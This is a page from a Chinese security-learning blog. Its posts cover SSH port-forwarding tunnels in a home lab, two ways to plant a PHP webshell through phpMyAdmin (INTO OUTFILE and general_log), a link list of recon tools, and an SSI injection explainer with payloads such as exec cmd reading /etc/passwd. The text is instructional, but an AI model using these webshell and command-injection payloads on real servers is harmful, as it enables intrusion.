+linux target 3   192.168.189.131</code></pre><p>打算模拟谷歌翻墙，首先打开两台linux 80 服务，</p>
+<p><img src="https://i.imgur.com/LdlCmCJ.png" alt></p>
+<p><img src="https://i.imgur.com/KDkfcmW.png" alt></p>
+<p>谷歌翻墙模拟，win10是一台国内被墙拦截的主机，</p>
+<p>linux 2 是一台墙外的一台服务器，可以访问谷歌。</p>
+<p>linux 3 是要访问的服务器。在此代表谷歌。</p>
+<p>第一步：先将win10 IP封禁。</p>
+<p>这里遇到第一个问题，可以看到三个IP 不是全部在同一个IP段，如果 2号 和 3 号互相访问，他们在同一个IP段会直接访问，这里，3号禁止2号IP，可以禁止2号访问，但是3号和1号不在同一个IP段，且物理机与虚拟机之间网路通信貌似还要端口转发之类的或者是直接走物理网卡，反正就是禁了也会被绕过，保证三台服务器在同一个IP段下。全部换成桥接模式，接下来从新测试。</p>
+<h2 id="第二次模拟VPN制作"><a href="#第二次模拟VPN制作" class="headerlink" title="第二次模拟VPN制作"></a>第二次模拟VPN制作</h2><p>从新开始！</p>
+<p>这里虚拟机换成桥接模式。</p>
+<p>重启网络服务  service network restart //更换网络模式要重启网络！</p>
+<pre><code>linux target 1   192.168.100.194
+linux target 2   192.168.100.110
+linux target 3   192.168.100.176</code></pre><p>#第一步 </p>
+<p>服务器3号封禁 linux 1 IP </p>
+<p>iptables -I INPUT -s 192.168.100.160 -j DROP //将linux1的包请求全部丢弃，访问停留几十秒最后无法访问。</p>
+<p>iptables -A INPUT -s 192.168.100.194 -j REJECT   //封禁IP</p>
+<p>iptables -I INPUT -s 192.168.100.219 -p tcp –dport 80 -j ACCEPT 解除限制</p>
+<p>清空封掉的IP地址，可以输入：iptables –flush</p>
+<p>而 2号服务器是可以正常访问 3号模拟谷歌服务器</p>
+<p>这里我们已经禁了一号服务器，一号服务器来访问下三号服务器。</p>
+<p><img src="https://i.imgur.com/8iBLnWK.png" alt></p>
+<p>可以看到一号服务器已无法访问 三号谷歌服务器。</p>
+<p>#第二步<br>端口转发</p>
+<p>首先查看自己开启的端口</p>
+<p><img src="https://i.imgur.com/rO0dudJ.png" alt></p>
+<p>我们选择一个端口1080端口建立动态转发的隧道，</p>
+<p>第一台服务器下的命令：ssh -D 1080 -fN 192.168.100.110//这里我们ssh连接第二台服务器，本地1080端口转发。相当于第二台服务器是一个跳板。</p>
+<p>命令注释：</p>
+<pre><code>选项：-f 后台启用
+-N 不打开远程shell，处于等待状态（不加-N则直接登录进去）
+-g 启用网关功能</code></pre><p>输入密码后登陆成功，在后台运行只是加入了一个进程。</p>
+<p>此时访问 服务器3依然是不成功的。</p>
+<p>设置代理服务器1访问服务器3，命令如下（在服务器1上输入）：</p>
+<pre><code>curl --socks5 127.0.0.1:1080 http://192.168.100.176</code></pre><p><img src="https://i.imgur.com/aOF4pLm.png" alt></p>
+<p>可以看到已经访问到第三台模拟谷歌浏览器</p>
+<p>#第三步</p>
+<p>浏览器设置代理1080端口就可以浏览器便捷的进行访问</p>
+<p><img src="https://i.imgur.com/EOJ4wuA.png" alt><br>代理前</p>
+<p><img src="https://i.imgur.com/LwrLisM.png" alt></p>
+<p>代理后，成功访问</p>
+<p><img src="https://i.imgur.com/7F4R3mg.png" alt></p>
+<p>如果有大陆以外的服务器，那么便可以自己制作VPN翻墙。简单使用！</p>
+<h1 id="利用跳板转发端口"><a href="#利用跳板转发端口" class="headerlink" title="利用跳板转发端口"></a>利用跳板转发端口</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>有三个机器，我们在第二台跳板机器执行命令，从而使得一号和三号机器可以互相访问。</p>
+<p>连接模式：桥接</p>
+<pre><code>linux target 1   192.168.100.110
+linux target 2   192.168.100.194
+linux target 3   192.168.100.176</code></pre><p>首先，我们先模拟环境，用三号服务器封禁一号服务器的IP，</p>
+<p>root@kali:~# iptables -A INPUT -s 192.168.100.110 -j REJECT//禁止IP访问任意端口</p>
+<p><img src="https://i.imgur.com/BbcqoB2.png" alt></p>
+<p>可以看到禁止192.168.100.110IP访问本机的任意端口</p>
+<p>我们使用三号服务器nc监听23端口。一号已经连接不到三号的23端口。二号服务器可以连接三号服务器23端口。环境搭建完毕。</p>
+<p>root@kali:~# nc -lvvp 23</p>
+<p>未完待续！</p>
+<p>然后在第二台主机输入命令 </p>
+<p>ssh -R 9527:192.168.100.176:23 -fN 192.168.100.110</p>
+<p>然后我们在 第一台服务器上执行 telnet 127.0.0.1 9527即可访问。</p>
+<p>可以看到nc监听的第三台机器 </p>
+<p><img src="https://i.imgur.com/qEMogZh.png" alt></p>
+<p>可以看到数据是从192.168.100.194（第三台主机）转发过来的</p>
+<p>设置VPN   </p>
+<p>在第二台主机输入命令 </p>
+<p>ssh -R 1080:192.168.100.176:80 -fN 192.168.100.110</p>
+<p>然后我们在 第一台服务器上执行 telnet 127.0.0.1 1080即可访问。</p>
+<p><img src="https://i.imgur.com/xYT2eMJ.png" alt></p>
+<p>可以正常访问网页了。<br>浏览器设置代理。</p>
+<hr>
+<p>参考：<a href="https://www.cnblogs.com/phpdragon/p/5314650.html" target="_blank" rel="noopener">https://www.cnblogs.com/phpdragon/p/5314650.html</a><br>参考：<a href="https://www.cnblogs.com/keerya/p/7612715.html" target="_blank" rel="noopener">https://www.cnblogs.com/keerya/p/7612715.html</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/phpmyadmin拿shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/18/phpmyadmin拿shell/" itemprop="url">phpmyadmin两种拿shell</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T00:00:00+08:00">
+                2018-11-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p>
+<h1 id="暴绝对路径"><a href="#暴绝对路径" class="headerlink" title="暴绝对路径"></a>暴绝对路径</h1><p>要写文件必须要知道根路径，否则即使写入了也无法访问，也就自然无法getshell，</p>
+<h1 id="phpmyadmin直接写入文件"><a href="#phpmyadmin直接写入文件" class="headerlink" title="phpmyadmin直接写入文件"></a>phpmyadmin直接写入文件</h1><p>先要知道根路径利用错误爆路径等，这里用phpinfo查看根路径</p>
+<p><img src="https://i.imgur.com/1smbgme.png" alt></p>
+<p>写入 一句phpinfo文件，</p>
+<pre><code>SELECT &quot;&lt;?php phpinfo();?&gt;&quot; INTO OUTFILE  &quot;E:\\wamp\\wamp\\www\\2.php&quot;</code></pre><p>这里必须注意要双反斜线，否则会转义，</p>
+<p><img src="https://i.imgur.com/4k6pFOy.png" alt></p>
+<p>可以看到已经上传并且解析</p>
+<p><img src="https://i.imgur.com/CuKvzMG.png" alt></p>
+<h1 id="利用日志getshell"><a href="#利用日志getshell" class="headerlink" title="利用日志getshell"></a>利用日志getshell</h1><p>原理，phpmyadmin有一个记录日志的文件，但是一般情况下会关闭，开启日志记录，然后设置日志记录名称为.php，随便执行sql语句，只要包括一句话木马就会被写入到日志中去，然后就可以连接getshell</p>
+<p>第一步手动开启日志。</p>
+<p>set global  general_log=’on’   //首先设置为on</p>
+<p>然后 查看是否开启成功</p>
+<p>show variables like “general_log%”</p>
+<p><img src="https://i.imgur.com/8qUo2mX.png" alt></p>
+<p>ON为开启，此时我们设置 日志路径</p>
+<pre><code>set global  general_log_file =&quot;E:\\wamp\\wamp\\www\\3.php&quot;</code></pre><p><img src="https://i.imgur.com/gwGGN5Z.png" alt></p>
+<p>然后只要执行的语句都会写入到日志文件中，所以我们查询语句<br>select ‘<?php eval($_POST['a']);?>‘</p>
+<p><img src="https://i.imgur.com/gkZ3kfr.png" alt></p>
+<p>会报错但是已经写入到日志中去了</p>
+<p><img src="https://i.imgur.com/RQaAHeN.png" alt></p>
+<p>此时连接网站/3.php即可getshell。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/网址收藏/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/18/网址收藏/" itemprop="url">个人网址收藏</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T00:00:00+08:00">
+                2018-11-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="web渗透博客"><a href="#web渗透博客" class="headerlink" title="web渗透博客"></a>web渗透博客</h1><p><a href="https://chybeta.github.io/2017/08/19/Web-Security-Learning/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/19/Web-Security-Learning/</a></p>
+<h1 id="php代码审计入门总结"><a href="#php代码审计入门总结" class="headerlink" title="php代码审计入门总结"></a>php代码审计入门总结</h1><p><a href="http://www.360doc.com/content/16/0215/14/26186435_534767147.shtml" target="_blank" rel="noopener">http://www.360doc.com/content/16/0215/14/26186435_534767147.shtml</a></p>
+<p><a href="http://www.am0s.com/" target="_blank" rel="noopener">http://www.am0s.com/</a></p>
+<h1 id="CTF工具库"><a href="#CTF工具库" class="headerlink" title="CTF工具库"></a>CTF工具库</h1><p><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">https://www.ctftools.com/down/</a></p>
+<h1 id="子域名在线接口"><a href="#子域名在线接口" class="headerlink" title="子域名在线接口"></a>子域名在线接口</h1><p><a href="http://ce.baidu.com" target="_blank" rel="noopener">http://ce.baidu.com</a></p>
+<p><a href="http://look.mimaz.org" target="_blank" rel="noopener">http://look.mimaz.org</a></p>
+<h1 id="解密cms识别等综合工具"><a href="#解密cms识别等综合工具" class="headerlink" title="解密cms识别等综合工具"></a>解密cms识别等综合工具</h1><p><a href="http://tools.bugscaner.com/（实用）" target="_blank" rel="noopener">http://tools.bugscaner.com/（实用）</a></p>
+<h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></p>
+<p><a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></p>
+<pre><code>开源：https://github.com/TideSec/TideFinger?tdsourcetag=s_pcqq_aiomsg</code></pre><p>wtf_scan</p>
+<pre><code>开源：https://github.com/dyboy2017/WTF_Scan</code></pre><h1 id="社工注册过网站的手机号邮箱"><a href="#社工注册过网站的手机号邮箱" class="headerlink" title="社工注册过网站的手机号邮箱"></a>社工注册过网站的手机号邮箱</h1><p><a href="https://www.reg007.com/s/798648772-at-qq.com//" target="_blank" rel="noopener">https://www.reg007.com/s/798648772-at-qq.com//</a></p>
+<h1 id="网盘爬虫"><a href="#网盘爬虫" class="headerlink" title="网盘爬虫"></a>网盘爬虫</h1><p><a href="http://tansuo233.com" target="_blank" rel="noopener">http://tansuo233.com</a></p>
+<h1 id="威胁情报分析"><a href="#威胁情报分析" class="headerlink" title="威胁情报分析"></a>威胁情报分析</h1><p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></p>
+<p><a href="https://poma.nsfocus.com" target="_blank" rel="noopener">https://poma.nsfocus.com</a> </p>
+<p><a href="https://ti.360.net" target="_blank" rel="noopener">https://ti.360.net</a></p>
+<p><a href="https://www.virustotal.com" target="_blank" rel="noopener">https://www.virustotal.com</a></p>
+<p><a href="http://www.threatcrowd.org" target="_blank" rel="noopener">http://www.threatcrowd.org</a></p>
+<p><a href="https://community.riskiq.com" target="_blank" rel="noopener">https://community.riskiq.com</a></p>
+<p><a href="https://www.venuseye.com.cn" target="_blank" rel="noopener">https://www.venuseye.com.cn</a></p>
+<p><a href="https://exchange.xforce.ibmcloud.com/" target="_blank" rel="noopener">https://exchange.xforce.ibmcloud.com/</a></p>
+<p><a href="https://alice.tj-un.com/#" target="_blank" rel="noopener">https://alice.tj-un.com/#</a></p>
+<h1 id="渗透工具集合"><a href="#渗透工具集合" class="headerlink" title="渗透工具集合"></a>渗透工具集合</h1><p><a href="https://www.jianshu.com/p/fc4ed837acac" target="_blank" rel="noopener">https://www.jianshu.com/p/fc4ed837acac</a></p>
+<p><a href="https://blog.csdn.net/Bul1et/article/details/85157176" target="_blank" rel="noopener">https://blog.csdn.net/Bul1et/article/details/85157176</a></p>
+<h1 id="IP反查"><a href="#IP反查" class="headerlink" title="IP反查"></a>IP反查</h1><p><a href="http://site.ip138.com" target="_blank" rel="noopener">http://site.ip138.com</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/17/SSI服务器注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/17/SSI服务器注入/" itemprop="url">SSI服务器注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-17T00:00:00+08:00">
+                2018-11-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="什么是SSI"><a href="#什么是SSI" class="headerlink" title="什么是SSI"></a>什么是SSI</h1><p>全程：server side includes injection 服务器端包含注入</p>
+<p>SSI是英文Server Side Includes的缩写，翻译成中文就是服务器端包含的意思。从技术角度上说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针。SSI具有强大的功能，只要使用一条简单的SSI 命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行shell和CGI脚本程序等复杂的功能。它与CGI类似，不同之处在于SSI用于在加载当前页面之前或在页面可视化时执行某些操作。 为此，Web服务器在将页面提供给用户之前分析SSI  </p>
+<p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p>
+<p>在很多场景中，用户输入的内容可以显示在页面中，比如一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞</p>
+<p>一种对于这类漏洞的挖掘方式即是查看.stm，.shtm和.shtml的页面是否存在，但是缺少这些类型的页面并不意味着不存在SSI攻击。</p>
+<h1 id="SSI漏洞产生的条件"><a href="#SSI漏洞产生的条件" class="headerlink" title="SSI漏洞产生的条件"></a>SSI漏洞产生的条件</h1><p>用户存在可控输入，并且未过滤，并且还能回显嵌入到html中，如其中一条 </p>
+<pre><code>&lt;!--#exec cmd=&quot;&quot;...&quot;&quot;--&gt;（会执行给定的 shell 命令）</code></pre><p>如果没有过滤吧&lt;!#–等敏感字符，就会造成系统命令执行，<br>通常存在XSS的地方如果开启了SSI服务，那么就会造成服务器注入</p>
+<pre><code>&lt;!--#include file=&quot;&quot;...&quot;&quot;--&gt;（会显示给定的文件）</code></pre><h1 id="SSI命令语法解析"><a href="#SSI命令语法解析" class="headerlink" title="SSI命令语法解析"></a>SSI命令语法解析</h1><p><img src="https://i.imgur.com/UMLJ6ul.png" alt></p>
+<p>①显示服务器端环境变量&lt;#echo&gt;</p>
+<pre><code>本文档名称：
+&lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt;
+现在时间：
+&lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt;
+显示IP地址：
+&lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt;</code></pre><p>②将文本内容直接插入到文档中&lt;#include&gt;</p>
+<pre><code>&lt;!--#include file=&quot;文件名称&quot;--&gt;
+&lt;!--#include virtual=&quot;index.html&quot; --&gt;
+&lt;!--#include virtual=&quot;文件名称&quot;--&gt;
+&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;</code></pre><p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p>
+<p>③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</p>
+<pre><code>文件最近更新日期：
+&lt;!--#flastmod file=&quot;文件名称&quot;--&gt;
+文件的长度：
+&lt;!--#fsize file=&quot;文件名称&quot;--&gt;</code></pre><p>④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</p>
+<pre><code>&lt;!--#exec cmd=&quot;文件名称&quot;--&gt;
+&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;
+&lt;!--#exec cgi=&quot;文件名称&quot;--&gt;
+&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;--&gt;</code></pre><p>⑤一次CTF中用到的指令 </p>
+<pre><code>&lt;!--%23include virtual=&quot;flag&quot; --&gt;</code></pre><p>1、显示服务器端环境变量&lt;#echo&gt;<br>2、将文本内容直接插入到文档中&lt;#include&gt;<br>3、显示WEB文档相关信息&lt;#flastmod #fsize&gt; (如文件制作日期/大小等)<br>4、直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)<br>5、设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)<br>   高级SSI<xssi>可设置变量使用if条件语句。<br>   SSI指令基本格式：&lt;!-– 指令名称=”指令参数”&gt;  </xssi></p>
+<p>注意：<br>1．&lt;!–与#号间无空格，只有SSI指令与参数间存在空格。<br>2．上面的标点=””，一个也不能少。<br>3．SSI指令是大小写敏感的，因此参数必须是小写才会起作用。<br>有的时候可使用`来绕过对”的过滤//有时候 有时候，</p>
+<p>SSI命令：<br><a href="https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection</a><br><a href="https://www.cnblogs.com/wqhwe/p/5442612.html" target="_blank" rel="noopener">https://www.cnblogs.com/wqhwe/p/5442612.html</a> </p>
+<h1 id="CTF实战SSI"><a href="#CTF实战SSI" class="headerlink" title="CTF实战SSI"></a>CTF实战SSI</h1><p><a href="https://shuaizhupeiqi.github.io/2018/11/16/2018%20%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9B/" target="_blank" rel="noopener">EIS-2018ctf挑战赛</a></p>
+<h1 id="SSI漏洞挖掘"><a href="#SSI漏洞挖掘" class="headerlink" title="SSI漏洞挖掘"></a>SSI漏洞挖掘</h1><p>SSI漏洞，一般存在xss的地方都值得一试。  </p>
+<p>并非所有文件中的SSI指令都会被解析，必须告诉Apache应该解析哪些文件。有两种方法使Apache解析带有特定后缀名的文件，比如：.shtml ，配置如下：</p>
+<pre><code>AddType text/html .shtml
+AddOutputFilter INCLUDES .shtml</code></pre><p>.stm，.shtm和.shtml的页面是否存在文件后缀名是用来表明网页文件是否包含SSI指令的，因此如果该网站使用了.shtml文件，那说明该网站支持SSI指令。然而.shtml后缀名并非是强制规定的，因此如果没有发现任何.shtml文件，并不意味着目标网站没有受到SSI注入攻击的可能。</p>
+<h1 id="SSI防护"><a href="#SSI防护" class="headerlink" title="SSI防护"></a>SSI防护</h1><p>默认apache不开启ssi，ssi这种技术已经比较少用了。如果应用没有使用到ssi，关闭服务器对ssi的支持即可。</p>
+<hr>
+<p>参考：<a href="https://www.cnblogs.com/jokermoon/p/6708691.html" target="_blank" rel="noopener">https://www.cnblogs.com/jokermoon/p/6708691.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.ico" alt="小猪佩奇">
+            
+              <p class="site-author-name" itemprop="name">小猪佩奇</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">小猪佩奇</span>
+
+  
+</div>
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+ 
+
+
+
+
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
